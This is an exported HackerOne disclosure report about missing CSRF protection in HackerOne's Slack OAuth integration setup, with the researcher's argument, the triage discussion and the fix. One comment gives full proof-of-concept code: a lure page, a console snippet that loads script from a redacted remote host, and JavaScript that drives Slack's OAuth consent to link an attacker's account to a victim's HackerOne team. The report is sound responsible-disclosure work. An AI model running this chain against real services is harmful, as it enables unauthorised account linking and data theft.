{"id":170552,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA1NTI=","url":"https://hackerone.com/reports/170552","title":"Slack integration setup lacks CSRF protection","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-09-19T21:16:55.829Z","submitted_at":"2016-09-19T21:16:55.829Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"whhackersbr","url":"/whhackersbr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-07-07T03:39:15.841Z","bug_reporter_agreed_on_going_public_at":"2021-07-07T03:39:15.727Z","team_member_agreed_on_going_public_at":"2021-07-06T18:51:18.688Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Details:\n**Summary:**\n\nCross-site Request Forgery in the `Integrations` (https://hackerone.com/[YOUR_TEAM]/integrations) feature for teams.\n\n**Description (Include Impact):**\n\nThe `Integrations` flow is insecure, because it can be abused by CSRF.\n\nPoC:\n\nRequest\n```\nGET https://hackerone.com/auth/slack HTTP/1.1\n```\n\nResponse\n```\nLocation: https://slack.com/oauth/authorize\n?client_id=2174110321.11522100978\n\u0026redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback\n\u0026response_type=code\n\u0026scope=incoming-webhook\n\u0026state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c\n```\n\nHow can it be bad since you are using `state` parameter?\n\nYou are trusting in third-party security that is not under your control.\nAll the attacker needs is an XSS or Login CSRF or Clickjacking in the third-party system and he can compromise your system. With one of the previous mentioned vulnerabilities in the third-party system, the attacker can control the entire OAuth flow and connect his own accounts to the victim's HackerOne account.\n\nToday, you have just one integration available (Slack).\nIf you implement more integrations in the future, the damage and the attack surface will grow significantly. Worst if you implement someday something like Login with Facebook / Login with Google / etc., because this bug will lead to account takeover.\n\n**Fix:**\n\n1) Protection against CSRF at the beginning of the OAuth flow:\n\ne.g.:\n\n```\nGET https://hackerone.com/auth/slack?CSRF_TOKEN=bdea53bd9a8c73bd983847 HTTP/1.1\n```\n\n2) `Phabricator` approach of OAuth connections (a confirmation dialog after the end of the OAuth flow). Picture attached (F121473).\n\nP.S.: Are you interested in Login XSRF in HackerOne?\nHow do you protect users against Login XSRF in your SSO flow?\nSorry, I can not fully test SSO because I need approval of SSO configuration every time.","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-08-05T18:51:18.827Z","allow_singular_disclosure_after":-5770789.244447994,"singular_disclosure_allowed":true,"vote_count":131,"voters":["adrianovalle","xploiterr","run_win","drsniper","whhackersbr","pleorqy","fqdn","alp","arthuraires","imranhudaa","and 121 more..."],"severity":{"rating":"high","score":8.2,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1205087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I forgot the picture.","automated_response":false,"created_at":"2016-09-19T21:24:24.117Z","updated_at":"2016-09-19T21:24:24.117Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":121475,"filename":"Phabricator.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/121/475/81f283ce8eb957efa7286b5c21f5cc6a017478b8/Phabricator.png?response-content-disposition=attachment%3B%20filename%3D%22Phabricator.png%22%3B%20filename%2A%3DUTF-8%27%27Phabricator.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSK4WOTH5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T135108Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDjst9aCdbYiLIMwr9Ch8DTQvtbqAq2PUTmVxrtmvThtAIgSEwpNKIplIEtz5xxnkJ1cS4PAKNsqIRPh%2BdjbNa6kNkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDKoloRrogbt9MrbINirXAweStit7tRbKldWmv5m56905qopCrhiIh0afa7BbXcyddiE1lVP3qkUzFkFARwrvCPxZZcK6znBAwkJeuq4ZLJKAiz3SE6Bbgz0dPuj5RcfBoLhQs58tlPQozqAXbn12Pem3I6YCouzl5yxAPj18pgpKNG9x0obczWpKTFqenMNS%2FDu29u%2FUXKeLdJ2YkbDJ3XC8il3DY%2BsF0AQK%2BTcpJmDkP%2FR6Dwfqj8V5nzSLB1B1Q6QKWpALdT%2FIkMCDfVSozDYYuJ%2B9d368wBuia6V19rrqP4dim%2Fn5rdZQAZGoaXUkXaah9AFHE0FSAuyZ8IZeejx3%2FdcPvRQe2Mtynd1G9IzsNxTMmMeNREOTl067S0zwh4y7t8KilEdNjQSMknLg5rIXLbexXIllu28cawyKmB%2B0EFLEWmIzIHF2qPobRuriHSz5yTIi7gEF8vXtLa4QXkyCv7CLN5Vxr%2FhBcUOJ0mor%2B1EH7PiNAJNHD7L9d3BsThsGtjiy5YJnYdjvpFzOy8Ro05N%2Bwb5lzjttxXZnLYahE5ZQL1WRoFq8GjlpDi49lPqx%2FKlTMF1sdKJQqPZ5DnOj8NpjT2u%2FvGPKmmbRTmrjR%2Btw5ZOX8amRb2qEQ0GO8SLbSeik7jDz8JCLBjqlAcqviimSgTUYofaoYwBX9mq7VXP5cwJTSm6hfLkG0QxpfImbjAzvJqxMzJa1M8izlVHsrcenCg4EcO8k%2BRgMmYj9Fwc9z6RJPYBR%2B1XesfAaFfpOmWU87WZPC%2B3JgE%2BYkn7oq3crPoupd2DALi7dIoYlyYw0rG3eP95a6C3LPyMxHWbXCufcqViLnI3Eh6pXDyFdYoSymtaB29TlNwveUgEvmnpZ0w%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d9647fdbbc988ba39a47def39c837d82d093c295908aea05fdc715aa5cde749b"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1206283,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @whhackersbr,\n\nCould you detail how your PoC would work? Setting up an integration with slack requires a number of actions other than the `GET` in your report, so setting up an integration with Slack can't be done with just this CSRF. \n\nBy enabling the slack integration, you entrust slack with your vulnerability data, so yeah, your attack surface will be larger. That's an accepted risk.\n\nCheers,\nDirk\n","automated_response":false,"created_at":"2016-09-20T09:08:26.675Z","updated_at":"2016-09-20T09:08:26.675Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1206371,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hey @dirk,\n\n\u003e Could you detail how your PoC would work? Setting up an integration with slack requires a number of actions other than the GET in your report, so setting up an integration with Slack can't be done with just this CSRF.\n\nHackerOne system just controls​ two steps of the OAuth flow, the start,​ with the CSRF issue, and the end, relying on the `state` parameter. All the other steps happen outside HackerOne and can be controlled by an attacker through XSS/CSRF/Clickjacking/Login CSRF bugs outside HackerOne's infrastructure, in this case in Slack.\n\ne.g.:\n```\nMalicious page -(opens)-\u003e Slack with XSS -(opens)-\u003e CSRF https://hackerone.com/auth/slack\n                                                                      |\n                                                                      V\n                                                     Slack OAuth flow controlled via XSS\n                                                                      |\n                                                                      V\n                                      https://hackerone.com/auth/slack/callback?(...)\u0026state=VALID_STATE\n\n*Now the attacker's Slack account is connected to victim's HackerOne account.\n```\n\n\u003e By enabling the slack integration, you entrust slack with your vulnerability data, so yeah, your attack surface will be larger. That's an accepted risk.\n\nYou didn't understand my point here.\n\nOne thing is the trust of the user on Slack, another thing is the trust of HackerOne's system in the security of external applications.\n\nI am saying that in the future, with more integrations available in HackerOne, the attack surface of this specific CSRF will be larger. I am not saying anything about the user trusting​ his vulnerability data to Slack, users can trust on who they want.\n\nIf you didn't fix this CSRF, you are trusting that all OAuth providers don't have any XSS/CSRF/Clickjacking/Login CSRF.","automated_response":false,"created_at":"2016-09-20T09:54:03.489Z","updated_at":"2016-09-20T09:54:51.679Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1206386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S.: \n\nMy point (conclusion):\n\nIf the user's data is secure in Slack is not a problem of HackerOne.\nBut if an attacker can steal data from HackerOne with a bug in Slack, this is a problem of HackerOne.\n\nThe solution here, protection against CSRF.","automated_response":false,"created_at":"2016-09-20T09:59:03.440Z","updated_at":"2016-09-20T10:00:02.950Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1207673,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S. 2: \n\nAre you interested in Login XSRF in HackerOne?\nHow do you protect users against Login XSRF in your SSO flow?\nSorry, I can not fully test SSO because I need an ​approval of SSO configuration every time.","automated_response":false,"created_at":"2016-09-20T20:47:19.878Z","updated_at":"2016-09-20T20:47:19.878Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1208775,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hey @whhackersbr,\n\nThank you for explaining this in such depth. It looks like this is a duplicate of an issue we've received before, which was at the time closed as `informative`. We're currently looking into the viability of hardening this flow against CSRF, so #103072 might be resolved at some point in the future, which would net you some rep as well. \n\nWe'll keep you posted!\nDirk","automated_response":false,"created_at":"2016-09-21T12:39:29.781Z","updated_at":"2016-09-21T12:39:29.781Z","original_report_id":103072,"actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1209362,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dirk,\n\nI did read #103072 twice and I really could not understand how my bug is a duplicate of that bug.\n\n#103072 is just about speculations on a nonrealistic scenario.\n#170552 is about CSRF, clearly demonstrated.\n\nI believe that I was not clear enough on some point.\nSo, please, tell me why do you consider this bug a duplicate of #103072?\n\nThanks.","automated_response":false,"created_at":"2016-09-21T18:15:50.491Z","updated_at":"2016-09-21T18:15:50.491Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1209373,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Sorry about that. I've asked the team to take another look.","automated_response":false,"created_at":"2016-09-21T18:19:10.466Z","updated_at":"2016-09-21T18:19:10.466Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1209374,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed,\n\nThanks.","automated_response":false,"created_at":"2016-09-21T18:20:26.465Z","updated_at":"2016-09-21T18:20:26.465Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1209492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed @dirk,\n\u003e P.S. 2:\nAre you interested in Login XSRF in HackerOne?\nHow do you protect users against Login XSRF in your SSO flow?\nSorry, I can not fully test SSO because I need an ​approval of SSO configuration every time.","automated_response":false,"created_at":"2016-09-21T19:21:41.799Z","updated_at":"2016-09-21T19:22:06.469Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1209512,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@whhackersbr, we prefer to keep one issue to a report, as it's very difficult to track multiple things otherwise.\n\nWe are definitely interested in Login XSRF, both via our normal flow and via SSO-via-SAML. If you would like to test our SAML flow for issues, feel free to sign-up with a test team and configure SAML with a domain you own and control. Shoot support@hackerone.com an e-mail about it when done, and I'll approve you.","automated_response":false,"created_at":"2016-09-21T19:36:55.045Z","updated_at":"2016-09-21T19:36:55.045Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210307,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @whhackersbr,\n\nApologies, I misinterpreted #103072 when closing this out, we're still looking into possible mitigations here, and we'll keep you posted! I've removed you from #103072 to keep everything clean, please let me know if you'd still want access to that report.\n\nDirk","automated_response":false,"created_at":"2016-09-22T07:26:56.826Z","updated_at":"2016-09-22T07:28:17.693Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1210322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dirk @reed @security,\n\nPoC URL:\nhttps://██████/hackerone-csrf.html\n\nSource-codes:\n\nhackerone-csrf.html\n```\n\u003chtml\u003e\n\t\u003chead\u003e\n\t\t\u003ctitle\u003e\n\t\t\tHackerOne OAuth CSRF - Malicious Page\n\t\t\u003c/title\u003e\n\t\u003c/head\u003e\n\t\u003cbody\u003e\n\t\t\u003ccenter\u003e\n\t\t\t\u003ch3\u003eHackerOne OAuth CSRF - Malicious Page\u003c/h3\u003e\n\t\t\t\u003cbr/\u003e\n\t\t\tCopy the javascript code bellow and paste on the target page's console, to fake an XSS.\n\t\t\t\u003cbr/\u003e\n\t\t\t\u003cbr/\u003e\n\t\t\t\u003ctextarea onclick=\"this.focus();this.select()\"\u003evar newScript = document.createElement('script');newScript.setAttribute('src', 'https://████/hackerone-csrf.js');document.head.appendChild(newScript);\u003c/textarea\u003e\n\t\t\t\u003cbr/\u003e\n\t\t\t\u003cbr/\u003e\n\t\t\t\u003ch3\u003e\n\t\t\t\t\u003ca href=\"https://whhackersbr.slack.com/SLACK-XSS-VULNERABLE-PAGE?fake_vulnerable_parameter=exploit_code\" target=\"_blank\"\u003eStart the Attack\u003c/a\u003e\n\t\t\t\u003c/h3\u003e\n\t\t\u003c/center\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n```\n\nhackerone-csrf.js\n```\nfunction http(method, url, data = null){\n\tvar xhttp = new XMLHttpRequest();\n\txhttp.open(method, url, false);\n\tif(data){\n\t\txhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n\t}\n\txhttp.send(data);\n\treturn xhttp.responseText;\n}\n\nfunction slackLogin(){\n\tvar response = http(\"GET\", \"https://whhackersbr.slack.com\");\n\tvar csrf_token = response.match(/name\\=\\\"crumb\\\" value\\=\\\"(.*?)\\\" \\/\\\u003e/i)[1];\n\ttry{\n\t\thttp(\"POST\", \"https://whhackersbr.slack.com\", \"signin=1\u0026redir=\u0026crumb=\"+encodeURI(csrf_token)+\"\u0026email=hackerone%40francanet.com.br\u0026password=teste123\u0026remember=on\");\n\t}\n\tcatch(err){\n\t}\n}\n\nfunction windowCrossDomainFinish(){\n\ttry{\n\t\twindow.opener.document;\n\t\tsetTimeout(function(){acceptOAuth()}, 2500);\n\t}\n\tcatch(err){\n\t\tsetTimeout(function(){windowCrossDomainFinish()}, 500);\n\t}\n}\n\nfunction acceptOAuth(){\n\turl = window.opener.document.getElementById(\"oauth_authorize_confirm_form\").action;\n\tcsrf_token = window.opener.document.getElementsByName(\"crumb\")[0].value;\n\twindow.opener.location.href = \"https://████████/hackerone-csrf-gameover.html\";\n\tdocument.body.innerHTML = '\u003cform id=\"puppet_form\" action=\"'+url+'\" method=\"post\"\u003e\\\n\t\t\t\t\t\u003cinput type=\"hidden\" name=\"create_authorization\" value=\"1\"/\u003e\\\n\t\t\t\t\t\u003cinput type=\"hidden\" name=\"crumb\" value=\"'+encodeURI(csrf_token)+'\"/\u003e\\\n\t\t\t\t\t\u003cinput type=\"hidden\" name=\"channel\" value=\"C03CKQQDQ\"/\u003e\\\n\t\t\t\t  \u003c/form\u003e';\n\tdocument.getElementById(\"puppet_form\").submit();\n}\n\nslackLogin();\nwindow.opener.location.href = \"https://hackerone.com/auth/slack?team_handle=security\";\nwindowCrossDomainFinish();\n```\n\nhackerone-csrf-gameover.html\n```\n\u003chtml\u003e\n\t\u003chead\u003e\n\t\t\u003ctitle\u003e\n\t\t\tHackerOne OAuth CSRF - GAME OVER\n\t\t\u003c/title\u003e\n\t\u003c/head\u003e\n\t\u003cbody\u003e\n\t\t\u003ccenter\u003e\n\t\t\t\u003ch3\u003eHackerOne OAuth CSRF - GAME OVER\u003c/h3\u003e\n\t\t\t\u003ch3\u003e\n\t\t\t\t\u003ca href=\"https://███/hackerone-csrf.html\"\u003eStart Again\u003c/a\u003e\n\t\t\t\u003c/h3\u003e\n\t\t\u003c/center\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n```","automated_response":false,"created_at":"2016-09-22T07:47:13.440Z","updated_at":"2019-04-10T23:04:49.358Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PoC Video:\nhttps://youtu.be/ueGL8kzMP5k\n\nIs it possible to find XSS in Slack:\nhttps://hackerone.com/reports/132104","automated_response":false,"created_at":"2016-09-22T07:55:48.897Z","updated_at":"2016-09-22T07:55:48.897Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I could try to find an XSS in Slack and create a real PoC without the fake XSS, but Slack doesn't allow sharing details about their vulnerabilities, so what is the point?\n=(\n\nPlease tell me if you need anything else.","automated_response":false,"created_at":"2016-09-22T08:01:54.255Z","updated_at":"2016-09-22T08:01:54.255Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210352,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dirk @reed @security,\n\nUnauthorized Access to Confidential Bug Descriptions\nhttps://youtu.be/koylzNTwrIU","automated_response":false,"created_at":"2016-09-22T08:22:17.787Z","updated_at":"2016-09-22T08:22:17.787Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1210364,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @whhackersbr,\n\nWe're thoroughly convinced, and we'll start work on this immediately. Thank you for a very clear PoC!\n\nDirk","automated_response":false,"created_at":"2016-09-22T08:42:59.352Z","updated_at":"2016-09-22T08:42:59.352Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1210367,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @dirk,\n\nSorry for my delay coding the PoC.\n=(\n\nI am at your disposal.\n;-)","automated_response":false,"created_at":"2016-09-22T08:44:39.238Z","updated_at":"2016-09-22T08:49:41.435Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1211055,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-09-22T16:10:00.242Z","updated_at":"2016-09-22T16:10:00.242Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1211067,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Our apologies for not immediately recognizing the issue here, we're currently looking for a thorough fix.\n\nWe'll keep you posted!","automated_response":false,"created_at":"2016-09-22T16:13:11.726Z","updated_at":"2016-09-22T16:13:11.726Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1211709,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@dirk,\n\nDon't worry.\nIf you didn't understand the issue since the beginning, it was my fault.\nI hope I could remediate my mistake.\n;-)","automated_response":false,"created_at":"2016-09-22T21:49:30.288Z","updated_at":"2016-09-22T21:49:30.288Z","actor":{"username":"whhackersbr","cleared":true,"url":"/whhackersbr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1214237,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@whhackersbr, this should be resolved. Can you confirm?\n\nAlso, anything else from http://www.oauthsecurity.com/ we're missing? :)","automated_response":false,"created_at":"2016-09-24T17:39:23.437Z","updated_at":"2016-09-24T17:39:23.437Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1214478,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@reed @dirk @security,\n\nSeens fixed to me.\n;-)\n\n\u003e Also, anything else from http://www.oauthsecurity.com/ we're missing? :)\n\nHmmm, very good article. I will look into it deeply and will let you know if I find 